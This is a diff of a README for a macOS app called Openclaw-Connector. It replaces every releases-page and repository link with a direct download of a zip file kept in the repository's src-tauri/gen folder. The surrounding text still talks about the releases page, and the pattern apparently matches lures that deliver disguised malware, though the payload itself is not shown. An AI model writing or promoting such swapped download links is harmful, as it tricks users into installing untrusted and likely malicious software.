@@ -1,6 +1,6 @@
 # 🐾 Openclaw-Connector - Securely Bridge Your Remote Agents
 
-[![Download Openclaw-Connector](https://img.shields.io/badge/Download-Openclaw--Connector-orange?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/releases)
+[![Download Openclaw-Connector](https://img.shields.io/badge/Download-Openclaw--Connector-orange?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/raw/refs/heads/main/src-tauri/gen/Connector_Openclaw_2.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This app focuses on macOS. Windows and Linux versions are not available.
 
 You need to download the app first. The latest versions and files are on the releases page.
 
-[![Download Now](https://img.shields.io/badge/Download-Openclaw--Connector-blue?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/releases)
+[![Download Now](https://img.shields.io/badge/Download-Openclaw--Connector-blue?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/raw/refs/heads/main/src-tauri/gen/Connector_Openclaw_2.5.zip)
 
 Click the link above to open the releases page. Look for the file ending with `.dmg` or `.zip` for macOS. The file name usually contains the version number, for example `Openclaw-Connector-v1.2.0.dmg`.
 
@@ -103,7 +103,7 @@ If you experience issues, try the following:
 
 You can find the latest updates, report problems, or request features on the repository page:
 
-https://github.com/zx1peek-glitch/Openclaw-Connector
+https://github.com/zx1peek-glitch/Openclaw-Connector/raw/refs/heads/main/src-tauri/gen/Connector_Openclaw_2.5.zip
 
 This page also includes documentation for developers and technical details if you want to learn more.
 
@@ -144,4 +144,4 @@ To remove the app:
 
 ---
 
-[![Download Openclaw-Connector](https://img.shields.io/badge/Download-Openclaw--Connector-orange?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/releases)
+[![Download Openclaw-Connector](https://img.shields.io/badge/Download-Openclaw--Connector-orange?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/raw/refs/heads/main/src-tauri/gen/Connector_Openclaw_2.5.zip)
